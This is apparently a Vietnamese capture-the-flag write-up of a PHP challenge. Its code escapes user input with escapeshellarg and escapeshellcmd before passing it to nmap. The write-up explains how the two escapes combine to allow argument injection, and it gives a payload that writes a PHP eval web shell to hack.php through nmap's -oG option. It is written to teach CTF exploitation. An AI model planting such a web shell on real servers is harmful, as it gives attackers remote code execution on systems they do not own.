Challenge cho ta source code sau:

```php
<?php
 
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
 
if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
```

Đầu tiên là `REMOTE_ADDR` và `X_FORWARDED_FOR` cũng ko quan trọng mấy.Ta có thể truyền tham số “host” thông qua method GET. Nếu tham số host có tồn tại thì nó sẽ được xử lí lần lượt qua 2 hàm `escapeshellarg()` và `escapeshellcmd()`.Đối với hàm `escapeshellarg` nó sẽ chuyển từ chuỗi thành tham số có thể sử dụng trong shell command, và bọc dấu ngoặc đơn để đảm bảo rằng các ký tự đặc biệt không được hiểu là phần của lệnh, mà chỉ được coi là phần chuỗi.

`escapeshellcmd` Đảm bảo rằng user chỉ thực hiện một command.Dấu “\” sẽ được thêm vào trước các kí tự & #; `| \? ~ <> ^ () [] {} $ *, \ X0A và \ xFF

# Bypass

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/4c964fda-0b73-49b1-8969-07d3b48ad741)


![image](https://github.com/Llam-a/BUUCTF/assets/115911041/2bd5a9be-1080-46f1-979f-e7cdf3a96f3b)

Mình có đọc [wu](https://security.szurek.pl/en/exploit-bypass-php-escapeshellarg-escapeshellcmd/#gitlist-rce-exploit) này, theo wu viết thì có cách để bypass 2 hàm này là Argument injection - tấn côn dựa trên việc giả các tham số.Vậy ta có pass vào các option mới cho command.Tùy vào command mà challenge cho thì cách bypass khác nhau. Với command của challenge cho là

`nmap -T5 -sT -Pn --host-timeout 2 -F`

Payload: `nmap -T5 -sT -Pn --host-timeout 2 -F '1'\\''shellcode\'`

shellcode: `'<?php eval($_POST["a"]);?> -oG hack.php '`

